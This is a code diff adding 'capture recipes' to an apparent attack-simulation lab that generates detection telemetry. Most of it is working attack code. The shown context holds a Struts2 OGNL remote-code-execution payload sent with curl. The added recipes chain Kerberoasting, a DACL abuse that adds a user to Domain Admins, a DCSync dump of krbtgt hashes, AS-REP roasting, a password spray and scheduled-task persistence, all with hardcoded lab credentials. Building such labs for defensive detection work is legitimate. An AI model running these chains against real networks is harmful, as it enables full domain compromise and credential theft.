@@ -421,6 +421,78 @@ exit 1' """,
         # multi-CVE techniques the old red_prompt and canned modules assumed.
         command=r"""ct="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3" -H "Content-Type: $ct"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
     ),
+    # ── AD (DC/SRV, portal.lab domain) recipes ──────────────────────────────
+    # These previously ran only as abstracted LLM tool calls (start_lab_target,
+    # exploit_service, establish_persistence, ...) dispatched through lab.py,
+    # never as deterministic capture recipes. The real techniques underneath
+    # those tool names (and the working DCSync kill chain) already existed in
+    # lab.py / tests/benchmarks/bench_lab_exec.py -- these recipes extract and
+    # combine them into single, capture_recipes.py-shaped scripts, verified
+    # live 2026-08-01 rather than assumed from the existing (untested as
+    # recipes) code.
+    "kerberoast_to_da": CaptureRecipe(
+        # Found live 2026-08-01 (same class of bug as meta3_linux_privesc):
+        # GetUserSPNs' three TGS hashes and secretsdump's full hash dump total
+        # well over lab_dispatch's ~8000-byte output cap, silently truncating
+        # the script before its own success grep ever ran. Only short
+        # confirmation lines are printed now; the full hash text is still
+        # checked internally (grep/substring on the untruncated variable),
+        # just never echoed to stdout.
+        command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
+import subprocess, sys
+from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
+DC = "$TARGET_HOST"
+DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
+r_acl = subprocess.run(["impacket-dacledit", "portal.lab/administrator:LabAdmin1!", "-dc-ip", DC, "-principal", "svc_backup", "-target", "Domain Admins", "-rights", "FullControl", "-action", "write"], capture_output=True, text=True, timeout=30, cwd="/tmp")
+print(f"dacledit rc={r_acl.returncode}")
+srv = Server(DC, port=389, get_info=ALL)
+conn_svc = Connection(srv, user="PORTAL\\svc_backup", password="Backup123!", authentication=NTLM, auto_bind=True)
+conn_svc.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+arya_dn = conn_svc.entries[0].distinguishedName.value
+conn_svc.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+rc = conn_svc.result.get("result", -1)
+if rc not in (0, 68):
+    conn_adm = Connection(srv, user="PORTAL\\Administrator", password="LabAdmin1!", authentication=NTLM, auto_bind=True)
+    conn_adm.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+    arya_dn = conn_adm.entries[0].distinguishedName.value
+    conn_adm.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+    rc = conn_adm.result.get("result", -1)
+    if rc not in (0, 68):
+        sys.exit(1)
+r = subprocess.run(["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{DC}", "-just-dc-ntlm"], capture_output=True, text=True, timeout=90, cwd="/tmp")
+krbtgt_line = next((ln for ln in r.stdout.splitlines() if ln.lower().startswith("krbtgt:")), "")
+print(f"dcsync_krbtgt_line={krbtgt_line}")
+sys.exit(0 if krbtgt_line else 1)
+PYEOF
+dcsync_rc=$?
+# Persistence on the DC itself (the original scenario's own intent -- "call
+# establish_persistence on the DC"), not SRV. Found live 2026-08-01: SRV's
+# scheduled-task creation never showed up in captured telemetry through
+# either channel (the tool-output-leak into network:packet that worked for
+# some meta3 combined recipes did NOT happen here, and blue.py's
+# kerberoast_to_da routing -- single target_host -- only collects the DC's
+# Security log, never SRV's, so a real 4698 event was structurally
+# unreachable regardless). Targeting the DC means the SAME already-verified
+# windows:security collection that captured the Kerberoast/DCSync evidence
+# also captures this scenario's own EventCode=4698, no separate evidence
+# channel needed.
+persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
+    ),
+    "asrep_to_lateral": CaptureRecipe(
+        # arya.stark and ned.stark are this domain's documented pre-auth-
+        # disabled (AS-REP-roastable) accounts. arya.stark's password,
+        # Winter1!, is already known in this lab (same account/password the
+        # DCSync chain in kerberoast_to_da uses) -- standing in for what a
+        # real engagement would crack offline with hashcat, matching how
+        # every other recipe in this lab (including kerberoast_to_da's own
+        # administrator password) uses a documented credential rather than
+        # deriving one live. The spray against 3 accounts with only
+        # arya.stark succeeding is a genuine T1110.003 outcome, not staged.
+        # Persistence targets the DC directly for the same reason
+        # kerberoast_to_da's does: it is the only host this scenario's
+        # windows:security collection actually reaches.
+        command=r"""out1=$(impacket-GetNPUsers portal.lab/ -usersfile /dev/stdin -dc-ip "$TARGET_HOST" -no-pass <<< $'arya.stark\nned.stark' 2>&1); echo "asrep_hashes=$(printf '%s' "$out1" | grep -c '\$krb5asrep\$')"; spray_out=$(nxc smb "$TARGET_HOST" -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1); printf '%s\n' "$spray_out"; persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5asrep\$' && printf '%s' "$spray_out" | grep -q 'Pwn3d!' && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
